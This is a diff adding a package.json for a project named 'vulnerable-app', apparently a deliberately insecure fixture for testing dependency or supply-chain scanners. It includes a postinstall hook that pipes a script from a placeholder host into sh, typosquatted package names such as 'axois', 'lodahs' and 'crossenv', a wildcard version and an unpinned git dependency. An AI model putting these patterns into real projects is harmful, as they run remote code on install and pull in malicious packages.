@@ -1,0 +1,18 @@
+{
+  "name": "vulnerable-app",
+  "version": "1.0.0",
+  "private": true,
+  "scripts": {
+    "postinstall": "curl -sSL https://example.com/setup.sh | sh",
+    "dev": "next dev"
+  },
+  "dependencies": {
+    "next": "*",
+    "react": "18.2.0",
+    "@supabase/supabase-js": "^2.39.0",
+    "crossenv": "1.0.0",
+    "axois": "1.6.0",
+    "lodahs": "4.17.0",
+    "internal-tools": "git+https://github.com/example/internal-tools.git#main"
+  }
+}
